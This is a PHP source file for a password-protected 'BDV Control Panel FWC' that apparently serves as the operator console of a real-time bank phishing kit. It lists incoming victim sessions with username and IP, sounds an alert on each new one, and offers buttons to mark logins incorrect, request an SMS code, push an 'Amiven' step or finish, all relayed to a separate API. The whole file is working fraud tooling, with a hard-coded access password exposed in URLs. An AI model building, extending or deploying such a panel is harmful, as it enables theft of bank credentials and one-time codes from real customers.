<?php
// control_panel.php

// 1. === CONFIGURACIÓN DE SEGURIDAD ===
$clave_secreta = 'db2026'; 

$pass_ingresada = $_POST['password'] ?? $_GET['pass'] ?? '';
$sessionsFile = 'datas/sessions_status.json';

// --- Lógica de Manejo de Acciones (WIPE ALL) ---
if (isset($_GET['action']) && $_GET['action'] === 'wipe_all' && $pass_ingresada === $clave_secreta) {
    file_put_contents($sessionsFile, json_encode([])); 
    header('Location: control_panel.php?pass=' . $clave_secreta . '&message=' . urlencode("SESIONES BORRADAS EXITOSAMENTE."));
    exit;
}

// --- Lógica de Eliminación Individual (AJAX) ---
if (isset($_GET['action']) && $_GET['action'] === 'delete_single' && isset($_GET['id']) && $pass_ingresada === $clave_secreta) {
    $sessions = file_exists($sessionsFile) ? json_decode(file_get_contents($sessionsFile), true) : [];
    if (isset($sessions[$_GET['id']])) {
        unset($sessions[$_GET['id']]); // Elimina el registro del array
        file_put_contents($sessionsFile, json_encode($sessions)); // Guarda el array actualizado
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Registro no encontrado']);
    }
    exit;
}

// 2. === VERIFICACIÓN DE ACCESO ===
if ($pass_ingresada !== $clave_secreta) {
    ?>
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Acceso FWC</title>
        <style>
            body { font-family: 'Segoe UI', system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #0f172a; margin: 0; }
            .login-box { background: #1e293b; padding: 40px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5); text-align: center; border: 1px solid #334155; }
            .login-box h1 { color: #f8fafc; margin-bottom: 5px; font-weight: 600; font-size: 1.5em; }
            .login-box h2 { color: #38bdf8; margin-bottom: 25px; font-weight: 400; font-size: 1.1em; letter-spacing: 1px; }
            .login-box input[type="password"] { padding: 14px; margin-bottom: 20px; border: 1px solid #475569; background: #0f172a; color: #f8fafc; border-radius: 8px; width: 260px; box-sizing: border-box; outline: none; transition: border 0.3s; }
            .login-box input[type="password"]:focus { border-color: #38bdf8; }
            .login-box button { background-color: #38bdf8; color: #0f172a; padding: 14px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: all 0.2s; width: 100%; }
            .login-box button:hover { background-color: #0ea5e9; transform: translateY(-1px); }
            .error { color: #ef4444; margin-top: 15px; font-size: 0.9em; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>Control Panel FWC</h1>
            <h2>Acceso Restringido</h2>
            <form method="POST" action="control_panel.php">
                <input type="password" name="password" placeholder="Clave de Acceso" required>
                <button type="submit">INGRESAR</button>
                <?php if (!empty($pass_ingresada) && $pass_ingresada !== $clave_secreta): ?>
                    <p class="error">Contraseña incorrecta.</p>
                <?php endif; ?>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit(); 
}

// 3. === LÓGICA DEL PANEL ===
$sessions = [];
if (file_exists($sessionsFile)) {
    $content = @file_get_contents($sessionsFile);
    if ($content !== false && $content !== '') {
        $decoded = json_decode($content, true);
        if (is_array($decoded)) {
            $sessions = $decoded;
        }
    }
}

// Filtramos las pendientes
$pendingSessions = array_filter($sessions, function($s) {
    return isset($s['status']) && $s['status'] === 'PENDING';
});

// Ordenamos el arreglo para que el más reciente (tiempo mayor) sea el primero
uasort($pendingSessions, function($a, $b) {
    $timeA = isset($a['time']) ? $a['time'] : 0;
    $timeB = isset($b['time']) ? $b['time'] : 0;
    return $timeB <=> $timeA;
});

// Calculamos la edad de la sesión
foreach ($pendingSessions as $id => &$session) {
    $session['age'] = isset($session['time']) ? (time() - $session['time']) : 'N/A';
}
unset($session);
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FWC Panel</title>
    <style>
        /* --- DISEÑO UI/UX MEJORADO --- */
        body {
            font-family: 'Inter', 'Segoe UI', sans-serif;
            margin: 0;
            background-color: #0f172a; 
            color: #e2e8f0;
        }
        
        .top-bar {
            background-color: #1e293b;
            border-bottom: 1px solid #334155;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        
        .brand-title {
            margin: 0;
            font-size: 1.4em;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .brand-bdv { color: #38bdf8; letter-spacing: 1px; }
        .brand-fwc { color: #94a3b8; font-weight: 400; font-size: 0.9em; border-left: 2px solid #475569; padding-left: 10px; }

        .btn-wipe {
            background-color: transparent;
            color: #ef4444;
            border: 1px solid #ef4444;
            border-radius: 6px;
            padding: 8px 16px;
            font-size: 0.85em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .btn-wipe:hover { background-color: #ef4444; color: #fff; }

        .main-container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }

        .message {
            background: #064e3b;
            color: #34d399;
            border: 1px solid #059669;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 6px;
            text-align: center;
            font-weight: 500;
        }

        .cards-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            align-items: start;
        }

        .session-card { 
            background-color: #1e293b;
            border: 1px solid #334155;
            padding: 20px; 
            border-radius: 12px; 
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            border-top: 4px solid #38bdf8;
            transition: transform 0.2s;
            animation: fadeIn 0.4s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .session-card:hover { transform: translateY(-2px); box-shadow: 0 8px 15px rgba(0,0,0,0.2); }

        .session-header {
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
            margin-bottom: 15px;
            font-size: 0.9em;
            color: #94a3b8;
            align-items: center;
        }
        
        .session-id { font-family: monospace; color: #cbd5e1; }
        
        /* Contenedor del reloj y la papelera */
        .header-actions {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        /* Nuevo botón de eliminar individual */
        .btn-delete-single {
            background: none;
            border: none;
            color: #ef4444;
            cursor: pointer;
            font-size: 1.2em;
            padding: 0;
            transition: transform 0.2s, color 0.2s;
            display: flex;
            align-items: center;
        }
        .btn-delete-single:hover {
            transform: scale(1.15);
            color: #dc2626;
        }

        .session-details {
            margin-bottom: 20px;
            font-size: 0.95em;
            line-height: 1.6;
        }
        
        .session-details strong { color: #f8fafc; }

        .no-sessions { 
            grid-column: 1 / -1;
            text-align: center; 
            color: #94a3b8; 
            padding: 50px; 
            background: #1e293b;
            border: 1px dashed #475569; 
            border-radius: 12px;
        }

        .actions-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }

        .decision-btn { 
            padding: 10px; 
            cursor: pointer; 
            border: none; 
            border-radius: 6px; 
            font-weight: 600; 
            font-size: 0.85em;
            transition: all 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }
        
        .btn-usuario { background-color: #334155; color: #f8fafc; }
        .btn-usuario:hover { background-color: #475569; }

        .btn-success { background-color: #059669; color: #fff; }
        .btn-success:hover { background-color: #047857; }

        .btn-amiven { background-color: #2563eb; color: #fff; }
        .btn-amiven:hover { background-color: #1d4ed8; }

        .btn-finalizado { background-color: #7c3aed; color: #fff; grid-column: 1 / -1; }
        .btn-finalizado:hover { background-color: #6d28d9; }

        .audio-notice { font-size: 0.8em; color: #64748b; text-align: center; margin-top: 30px; }
    </style>
    <script>
        const CLAVE_SECRETA = '<?php echo $clave_secreta; ?>';
        let refreshIntervalId; 
        
        let knownSessions = new Set();
        let isFirstLoad = true;
        let audioCtx = null;

        function initAudio() {
            if (!audioCtx) {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                audioCtx = new AudioContext();
            }
            if (audioCtx.state === 'suspended') {
                audioCtx.resume();
            }
        }

        function playAlertSound() {
            try {
                initAudio();
                const osc = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                
                osc.type = 'sine';
                osc.frequency.setValueAtTime(880, audioCtx.currentTime); 
                
                gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
                gainNode.gain.linearRampToValueAtTime(0.5, audioCtx.currentTime + 0.05);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
                
                osc.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                
                osc.start();
                osc.stop(audioCtx.currentTime + 0.5);
            } catch(e) {
                console.log("Audio no soportado");
            }
        }

        // --- FUNCIONES DE COMUNICACIÓN ---

        // Función para cambiar de estado (redireccionar al usuario)
        function sendDecision(sessionId, action) {
            clearInterval(refreshIntervalId); 
            const formData = new FormData();
            formData.append('session_id', sessionId);
            formData.append('action', action);

            fetch('control_api.php', { method: 'POST', body: formData })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    knownSessions.delete(sessionId); 
                    loadSessions(); 
                    startAutoRefresh(); 
                } else {
                    alert('Error: ' + data.error);
                    startAutoRefresh(); 
                }
            })
            .catch(error => {
                console.error('Error de comunicación:', error);
                startAutoRefresh(); 
            });
        }
        
        // ¡NUEVA FUNCIÓN! - Para eliminar físicamente un registro
        function deleteSingleRecord(sessionId) {
            if (!confirm('¿Estás seguro de que deseas eliminar este registro?')) {
                return;
            }

            clearInterval(refreshIntervalId); 
            
            // Hacemos una petición GET a este mismo archivo pidiendo la eliminación
            fetch(`control_panel.php?action=delete_single&id=${sessionId}&pass=${CLAVE_SECRETA}`)
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    knownSessions.delete(sessionId); 
                    loadSessions(); // Refresca la pantalla de inmediato
                    startAutoRefresh(); 
                } else {
                    alert('Error al eliminar: ' + (data.error || 'Desconocido'));
                    startAutoRefresh(); 
                }
            })
            .catch(error => {
                console.error('Error de red al eliminar:', error);
                startAutoRefresh(); 
            });
        }
        
        // --- FUNCIONES DE ACTUALIZACIÓN VISUAL ---
        function loadSessions() {
            const url = `control_panel.php?pass=${CLAVE_SECRETA}`;
            
            fetch(url)
            .then(response => response.text())
            .then(html => {
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const newCardsGrid = doc.getElementById('dinamic-cards');
                
                if (newCardsGrid) {
                    const currentGrid = document.getElementById('dinamic-cards');
                    currentGrid.innerHTML = newCardsGrid.innerHTML;
                    
                    const sessionElements = currentGrid.querySelectorAll('.session-card');
                    let currentIds = new Set();
                    let foundNew = false;

                    sessionElements.forEach(el => {
                        const id = el.getAttribute('data-id');
                        currentIds.add(id);
                        if (!knownSessions.has(id)) {
                            foundNew = true;
                            knownSessions.add(id);
                        }
                    });

                    knownSessions.forEach(id => {
                        if (!currentIds.has(id)) { knownSessions.delete(id); }
                    });

                    if (foundNew && !isFirstLoad) {
                        playAlertSound();
                    }
                    isFirstLoad = false;
                }
            })
            .catch(error => console.error('Fallo actualización en 2do plano:', error));
        }
        
        function confirmWipeAll() {
            if (confirm('ADVERTENCIA: ¿Borrar TODAS las sesiones de la base de datos?')) {
                window.location.href = '?action=wipe_all&pass=' + CLAVE_SECRETA;
            }
        }
        
        function startAutoRefresh() {
            clearInterval(refreshIntervalId); 
            refreshIntervalId = setInterval(loadSessions, 3000); 
        }

        window.onload = () => {
            document.querySelectorAll('.session-card').forEach(el => {
                knownSessions.add(el.getAttribute('data-id'));
            });
            isFirstLoad = false;
            startAutoRefresh();
        };

        document.addEventListener('click', initAudio, { once: true });
    </script>
</head>
<body>

<div class="top-bar">
    <h1 class="brand-title">
        <span class="brand-bdv">BDV</span>
        <span class="brand-fwc">Control Panel FWC</span>
    </h1>
    <button type="button" onclick="confirmWipeAll()" class="btn-wipe">
        ⚠️ Limpiar Toda la Base
    </button>
</div>

<div class="main-container">
    <?php if (isset($_GET['message'])): ?>
        <div class="message"><?php echo htmlspecialchars($_GET['message']); ?></div>
    <?php endif; ?>

    <div id="dinamic-cards" class="cards-grid">
        <?php if (empty($pendingSessions)): ?>
            <div class="no-sessions">
                ☕ No hay solicitudes entrantes en este momento.
            </div>
        <?php else: ?>
            <?php foreach ($pendingSessions as $id => $session): ?>
                <div class="session-card" data-id="<?php echo htmlspecialchars($id); ?>">
                    
                    <div class="session-header">
                        <span class="session-id">ID: <?php echo substr($id, 0, 8); ?></span>
                        
                        <!-- Caja que contiene el tiempo y el NUEVO botón de eliminar -->
                        <div class="header-actions">
                            <span>⏱️ <?php echo $session['age']; ?>s</span>
                            <button class="btn-delete-single" onclick="deleteSingleRecord('<?php echo htmlspecialchars($id); ?>')" title="Eliminar este registro">
                                🗑️
                            </button>
                        </div>
                    </div>

                    <div class="session-details">
                        <div><strong>Usuario:</strong> <?php echo htmlspecialchars($session['user'] ?? 'N/A'); ?></div>
                        <div><strong>IP:</strong> <?php echo htmlspecialchars($session['ip'] ?? 'N/A'); ?></div>
                    </div>
                    
                    <div class="actions-grid">
                        <button class="decision-btn btn-usuario" onclick="sendDecision('<?php echo $id; ?>', 'USUARIO')">
                            ❌ Incorrecto
                        </button>
                        <button class="decision-btn btn-success" onclick="sendDecision('<?php echo $id; ?>', 'SUCCESS')">
                            💬 Pedir SMS
                        </button>
                        <button class="decision-btn btn-amiven" onclick="sendDecision('<?php echo $id; ?>', 'AMIVEN')">
                            📱 Amiven
                        </button>
                        <button class="decision-btn btn-finalizado" onclick="sendDecision('<?php echo $id; ?>', 'FINALIZADO')">
                            🏁 Finalizado
                        </button>
                    </div>

                </div>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>
    
    <p class="audio-notice">
        * Haz click en cualquier parte de la pantalla una vez para habilitar las alertas de sonido.
    </p>
</div>

</body>
</html>